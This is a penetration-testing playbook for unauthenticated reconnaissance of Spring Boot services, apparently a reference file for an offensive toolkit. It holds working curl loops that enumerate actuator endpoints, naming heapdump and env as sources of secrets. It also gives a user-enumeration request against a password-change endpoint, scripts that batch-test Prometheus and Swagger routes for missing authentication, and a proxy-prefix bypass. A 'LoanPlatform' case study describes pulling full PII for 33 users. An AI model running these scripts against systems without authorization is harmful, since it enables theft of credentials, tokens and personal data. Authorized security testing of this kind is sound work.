# Spring Boot Unauthenticated Recon Patterns

## Actuator Enumeration
When target is Java/Spring Boot (indicators: istio-envoy, JSON error format with "timestamp"/"status"/"error"/"path"):

```
# Standard actuator paths to test on each discovered service prefix
for ep in actuator actuator/health actuator/env actuator/info actuator/beans actuator/mappings actuator/configprops actuator/prometheus actuator/loggers actuator/metrics actuator/threaddump actuator/heapdump; do
  code=$(curl -sk "https://TARGET/PREFIX/$ep" -o /dev/null -w "%{http_code}")
  [ "$code" != "404" ] && echo "$ep -> $code"
done
```

### High-value actuator endpoints
- `/actuator/env` — DB passwords, API keys, Spring config (often masked but check for custom properties)
- `/actuator/prometheus` — Kafka consumers, JVM internals, Hibernate domain entities, connection counts
- `/actuator/info` — Git commit, branch, build version, artifact coordinates
- `/actuator/heapdump` — Full JVM heap (contains secrets, sessions, tokens in memory)
- `/actuator/mappings` — All URL routes mapped (replaces manual JS endpoint extraction)

### Gotchas
- Some apps serve SPA catch-all (returns HTML for all 200s) — check Content-Type, not just status code
- Try actuator on EACH microservice prefix separately (e.g., /app/idm/actuator vs /app/jfs/actuator)
- Spring Boot 2.x requires `/actuator/` prefix; Boot 1.x exposes at root (`/health`, `/env`)

## User Enumeration via Password Change
When password-change endpoint exists without auth enforcement:

```
# Differential response reveals user existence
# "Invalid Current Password" = user EXISTS
# "User not found" = user DOES NOT EXIST
curl -X POST .../idm/passwords/force-change \
  -H "Content-Type: application/json" \
  -d '{"code":"TARGET_USER","oldPassword":"x","newPassword":"Valid1234","newPassword2":"Valid1234"}'
```

Pattern: Any endpoint that validates "old password" before checking auth will leak user existence through error differentiation. Also applies to: password reset, account recovery, MFA enrollment.

## JS Bundle API Extraction (Webpack/Vue/React)
For minified Webpack bundles, useful grep patterns (macOS grep lacks -P, use -oE):

```bash
# API base URLs
grep -oE '(API_[A-Z_]+):\{BASE_URL:"[^"]*"' app.*.js

# Route paths
grep -oE 'path:"[^"]*"' app.*.js | sort -u

# Endpoint strings
grep -oE '"/(api|v[0-9]+|auth|login|oauth|admin|idm|user)[^"]*"' app.*.js | sort -u

# Relative API paths
grep -oE '"/[a-zA-Z0-9_-]+/[a-zA-Z0-9_/-]+"' app.*.js | sort -u
```

## Broken Access Control Indicators
When backend returns 500 (not 401) for unauthenticated requests to protected endpoints:
- Means auth check is NOT at gateway/filter level
- Backend processes the request but fails on missing session/user data
- HIGH severity: confirms systemic broken access control
- Always test with valid-looking payloads — may return actual data

Compare:
- `401 Unauthorized` = auth filter working correctly
- `500 Internal Server Error` = request passed auth, failed inside business logic = BROKEN AUTH
- `200 with data` = fully broken access control

## Client-Side Crypto Analysis
When login uses client-side hashing (CryptoJS, SubtleCrypto):
1. Find the hashing call in JS bundle (grep for PBKDF2, SHA, bcrypt, scrypt)
2. Extract params: `CryptoJS.PBKDF2(password, salt)` — check defaults in vendor chunk
3. CryptoJS PBKDF2 defaults: **SHA1 hasher, 1 iteration, keySize=4 words (16 bytes)**
4. Build a login helper script with same crypto lib (npm install crypto-js)
5. Note: PBKDF2 with 1 iteration is effectively plaintext — trivial to brute-force offline

## Prometheus URI Batch Testing (MANDATORY when actuator/prometheus found)

When `/actuator/prometheus` is accessible, extract ALL URI labels and test each one unauth.
This is the highest-yield technique for finding broken access control — endpoints invisible to
JS bundle analysis or path fuzzing appear here because the app tracks metrics on every route.

```bash
# Extract all URI paths from prometheus metrics
curl -sk "https://TARGET/PREFIX/actuator/prometheus" | grep -oE 'uri="[^"]+"' | \
  sed 's/uri="//;s/"//' | sort -u > /tmp/prometheus-uris.txt

# Batch test each URI for unauth access
while read uri; do
  # Skip actuator/error paths
  echo "$uri" | grep -qE "^/(actuator|error)" && continue
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/PREFIX${uri}" 2>/dev/null)
  [ "$code" != "401" ] && [ "$code" != "403" ] && [ "$code" != "404" ] && \
    echo "[UNAUTH] ${uri} -> ${code}"
done < /tmp/prometheus-uris.txt
```

### LoanPlatform Pattern (June 2026)
Prometheus exposed 75+ URI labels. Batch testing revealed:
- `/user-resources/users/{login}` — full PII (email, phone, roles) for all 33 users
- `/task-approvals/created-by` — username list enabling the above exploit

## "500 Not 401" Pattern: Systematic Broken Access Control Detection

**LoanPlatform (June 2026):** When testing endpoints for auth, many returned HTTP 500 (not 401/403). This indicates the endpoint PROCESSES the request without auth but fails on missing business data — a reliable signal for broken access control:

| Response | Meaning |
|----------|---------|
| 401/403 | Auth enforced (secure) |
| 500 + "Internal Server Error" | NO auth check, fails on business logic (VULN!) |
| 400 + validation error | NO auth check, validates input (VULN!) |
| 200 + data | NO auth check, returns data (CRITICAL!) |

**Technique:** When Swagger/OpenAPI spec is exposed, test EVERY endpoint and classify by response:
```python
# For each endpoint in Swagger spec:
# GET endpoints: test bare; POST: test with empty {} body
# Classify: 401 = secured, anything else = broken access control
for path, methods in spec['paths'].items():
    if 'get' in methods:
        status = request(GET, base + path)
        if status != 401 and status != 403 and status != 404:
            print(f"[UNAUTH] {path} -> {status}")
```

**Results (LoanPlatform):** Of 75+ IDM endpoints:
- 18 GET endpoints returned 200 without auth (data exposure)
- 7 POST write endpoints returned 500/400 without auth (task-approvals, branches, parameters)
- Only /users/submit, /roles/submit, /users/status properly returned 401

**Root cause:** Spring Security filter chain configured at path-prefix level — protected `/users/*` and `/roles/*` but left `/task-approvals/*`, `/branches/*`, `/parameters/*`, `/passwords/*` open.

## SPA Proxy Prefix Bypass (confirmed LoanPlatform June 2026)

When a SPA serves from a sub-path with `<base href=/app/client/>`, the reverse proxy may forward ALL sub-paths to backend services without auth. Test:
1. Direct backend: `/app/service/api/endpoint` → may return 400/404 (Istio blocks)
2. Via SPA prefix: `/app/client/api/endpoint` → returns 200 (proxied, no auth!)

This single misconfig was the root cause of 10+ Critical findings — the SPA's nginx/envoy proxies everything under its base path without enforcing authentication.

## Related References
- `references/conductor-workflow-engine-exploitation.md` — Netflix Conductor UI exploitation (env vars, internal K8s URLs, workflow SSRF)
- `references/k8s-istio-internal-enumeration.md` — K8s/Istio service mesh enumeration
- `/oauth/token_key` — RSA public key for token verification
- `/profile-info/` — Spring active profiles
- `/swagger-resources` — Swagger API docs pointer
- `/v2/api-docs?group=idm` — full OpenAPI spec

**Key chain**: Prometheus URIs → username list endpoint → PII endpoint with known usernames.
This pattern is invisible to standard fuzzing because `/user-resources/users/{login}` requires
a valid username in the path — which you only get from `/task-approvals/created-by`.

## Related References
- `references/conductor-workflow-engine-exploitation.md` — Netflix Conductor UI on K8s targets
- `references/spring-boot-unauth-password-change-exploitation.md` — Detailed password change + user enum chain
- `references/phase1-passive-recon.md` (Prometheus URI section) — Mandatory batch unauth testing
- `references/bulk-actuator-scanning.md` — Multi-service actuator enumeration
